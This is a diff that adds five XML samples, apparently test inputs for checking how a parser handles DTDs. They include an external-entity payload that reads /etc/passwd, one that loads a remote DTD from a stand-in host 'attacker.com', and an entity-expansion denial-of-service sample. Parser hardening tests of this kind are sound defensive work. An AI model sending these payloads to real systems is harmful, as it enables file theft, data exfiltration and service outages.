@@ -1,0 +1,57 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root id="test1">&xxe;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<data>
+  <item attr="&malicious;">content</item>
+</data>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<svg>&lol3;</svg>
+```
+
+```xml
+<!DOCTYPE html [
+  <!ELEMENT html (body)>
+  <!ELEMENT body (div*)>
+  <!ELEMENT div (#PCDATA)>
+  <!NOTATION jpeg SYSTEM "image/jpeg">
+  <!ENTITY file SYSTEM "file.txt" NDATA jpeg>
+]>
+<html>
+  <body>
+    <div>test&file;</div>
+  </body>
+</html>
+```
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE config [
+  <!ENTITY % param1 "value1">
+  <!ENTITY % param2 "<!ENTITY internal '%param1;'>">
+  %param2;
+]>
+<config>
+  <setting>&internal;</setting>
+</config>
+```
